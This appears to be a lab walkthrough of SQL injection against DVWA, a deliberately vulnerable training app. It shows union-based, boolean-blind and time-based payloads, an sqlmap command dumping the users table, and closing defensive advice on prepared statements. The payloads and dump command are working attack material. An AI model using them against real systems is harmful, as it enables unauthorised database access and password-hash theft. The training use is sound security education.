# SQL Injection on DVWA (Union-based, Blind, Time-based + sqlmap)

## Web exploitation – SQL Injection

We use a **DVWA (Damn Vulnerable Web Application)** instance, on the classic sql injection vulnerability page, with security set to **low**.

What are we doing:

* Exploit **classic/union-based SQL injection** to list tables, columns and users.
* Use **boolean-based blind SQL injection** to infer data bit by bit.
* Use **time-based blind SQL injection** with `sleep()` to confirm conditions.
* Finally, use **sqlmap** to fully automate dumping the `users` table.

All of this happens through the vulnerable `id` parameter in:

`/dvwa/vulnerabilities/sqli/?id=...&Submit=Submit`

---

## Example commands / payloads

* DVWA is running on: `http://192.168.0.101/dvwa/`
* Security level: **low**

* We are authenticated in DVWA, so have a cookie
We can test these either via a browser (by editing the `id` parameter in the URL) or via `curl`.

---

### 1. Basic SQL injection – `' or 1=1 --`

Verify that the `id` parameter is vulnerable to SQL injection and bypass the original query logic.

```sql
' or 1=1 --
```

This typically changes a query like:

```sql
SELECT first_name, last_name FROM users WHERE id = '$id';
```

into:

```sql
SELECT first_name, last_name FROM users WHERE id = '' or 1=1 -- ';
```

* `or 1=1` – always true
* `--` – comment indicator, ignores the trailing `'`

**Effect:** We should see **all** users returned instead of just the one with `id=1`.

---

### 2. UNION-based SQL injection – Enumerate tables and columns

Now we use **UNION SELECT** + `information_schema` to enumerate metadata.

In DVWAs simple sql injection page there are often two columns selected, so the UNION queries use `..., null` to match the column count.

#### 2.1 List columns of `users` table

**Injection:**

```sql
' or 1=0 union select column_name, null 
from information_schema.columns 
where table_name='users' #
```

* `1=0` ensures the original SELECT returns no rows.
* `union select column_name, null ...` makes DVWA display `column_name` values.

Column names like `user`, `password`, `first_name`, etc.

---

#### 2.2 List all table names

**Injection:**

```sql
' or 1=0 union select table_name, null 
from information_schema.tables #
```

This prints all tables in the database.

---

#### 2.3 Extract username and password from `users` table

Once we know the table/column names:

**Injection:**

```sql
' or 1=0 union select user, password 
from users #
```

Now the page will list entries such as:

```text
admin | 5f4dcc3b5aa765d61d8327deb882cf99
```

(where the passwords are usually MD5 hashes, which we can check in the rainbow tables to see the real value of it).

---

#### 2.4 Combine user and password in one column

To display both in one field, use `concat`:

**Injection:**

```sql
' or 1=0 union select null, concat(user, ':', password) 
from users #
```

Outputs like:

```text
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

---

### 3. Boolean-based blind SQL injection

**blind**: the page doesnt directly show DB errors or data, but its **behaviour** changes (for example, returns a normal page, no output for false).

#### 3.1 Test a false condition

**False test:**

```sql
' or substring(system_user(), 1, 1)='a' #
```

Since the URL takes parameters, rather than using the page itself, we can also insert the parameter to URL.
**URL (false):**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=' or substring(system_user(), 1, 1)='a' #&Submit=Submit
```

* `system_user()` returns the DB user(`root@localhost`).
* `substring(system_user(), 1, 1)` extracts the first character.
* If its not `a`, the condition is false -> page shows nothing.

#### 3.2 Test a true condition

**True test (first char is 'r'):**

```sql
' or substring(system_user(), 1, 1)='r' #
```

**URL (true):**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=' or substring(system_user(), 1, 1)='r' #&Submit=Submit
```

When this is true, DVWA behaves as if the query returned results and then we see a list of users:

```text
ID: ' or substring(system_user(), 1, 1)='r' #
First name: admin
Surname: admin

First name: Gordon
Surname: Brown

First name: Hack
Surname: Me

First name: Pablo
Surname: Picasso

First name: Bob
Surname: Smith
```

So:

* `'a'` -> no users -> false
* `'r'` -> all users -> true

From that we infer that `substring(system_user(), 1, 1) = 'r'`.

Repeating this approach for positions `2,3,4,...` and we can reconstruct `root@localhost` character by character.

---

#### 3.3 Blind UNION with system_user()

We can also mix UNION and blind logic to show the DB user in a field:

```sql
' or 1=0 union select null, concat(system_user(), ':', password) from users #
```

**URL:**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=' or 1=0 union select null, concat(system_user(), ':', password) from users #&Submit=Submit
```

This can display something like:

```text
root@localhost:5f4dcc3b5aa765d61d8327deb882cf99
...
```

So we now know both the DB account and user hashes.

---

### 4. Time-based blind SQLi (`sleep()`)

If the application doesnt show different contents for true/false, we can still detect injection using **delays**.

#### 4.1 Baseline tests

**Always false:**

```sql
1' and 1=0 and sleep(5) #
```

**URL:**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1' and 1=0 and sleep(5) #&Submit=Submit
```

**Always true:**

```sql
1' and 1=1 and sleep(5) #
```

**URL:**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1' and 1=1 and sleep(5) #&Submit=Submit
```

This should cause the **page to hang 5 seconds** before responding.

* Confirms that `sleep(5)` actually delays the DB (and that our injection works).

#### 4.2 Time-based blind on `system_user()`

**False guess:**

```sql
1' and substring(system_user(), 1, 1)='a' and sleep(5) #
```

**URL:**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1' and substring(system_user(), 1, 1)='a' and sleep(5) #&Submit=Submit
```

* If the first char is not `a`, condition is false -> no delay.

**True guess (for `r`):**

```sql
1' and substring(system_user(), 1, 1)='r' and sleep(5) #
```

**URL:**

```text
http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1' and substring(system_user(), 1, 1)='r' and sleep(5) #&Submit=Submit
```

* Here, if `substring(...,1,1)='r'` is true, the DB executes `sleep(5)` and the page takes longer.
* From the **timing difference** we can understand that the condition is true.

Repeating this across characters can help learn any string *without ever seeing it printed*.

---

### 5. Automating exploitation with sqlmap

Once we know:

* The vulnerable URL,
* The vulnerable parameter (`id`),
* The DB type (MySQL),
* And we have a valid session cookie,

we can let **sqlmap** do the enumeration and dump it.

**Command:**

```bash
sqlmap -u "http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=a61eef8e040077ca2e4a3551f5fa4aec" \
  -D dvwa -T users --columns --dump
```

Breakdown:

* `-u "http://...id=1&Submit=Submit"`
  Target URL including the vulnerable parameter.
* `--cookie="security=low; PHPSESSID=..."`
  Pass DVWA cookies so sqlmap stays logged in.
* `-D dvwa`
  Target database name (`dvwa`).
* `-T users`
  Target table (`users`).
* `--columns`
  List columns of the `users` table.
* `--dump`
  Dump (extract) all rows from `dvwa.users`.

sqlmap will:

* Detect the injection technique.
* Enumerate DB structure.
* Dump the `users` table with usernames, password hashes...
---

## Analysis/Notes

* **Union-based SQLi** is convenient when the application **prints results** back to the page. Then we can see tables, columns and data immediately...
* **Boolean-based blind SQLi** shows how you can extract information even without explicit error messages or data:

  * You turn the application into something that answers “true/false” questions.
* **Time-based blind SQLi** is even stealthier:

  * No visible difference in page content, only in **response time**.
  * Works even when errors and results are suppressed.
* **sqlmap** automates all of these techniques:

  * It can discover and exploit union-based, error-based, boolean-based and time-based injections.
  * Once you confirm a parameter is injectable, sqlmap can systematically extract everything, which is why its such a strong tool.

From a **defensive** perspective:

* We must never build queries by concatenating user input (`"... WHERE id = '$id'"`).
* Use **parameterised queries / prepared statements**, proper input validation, and least-privilege DB accounts.
* Hardening and WAFs help, but the fundamental fix is: *don’t put raw user input into SQL*.

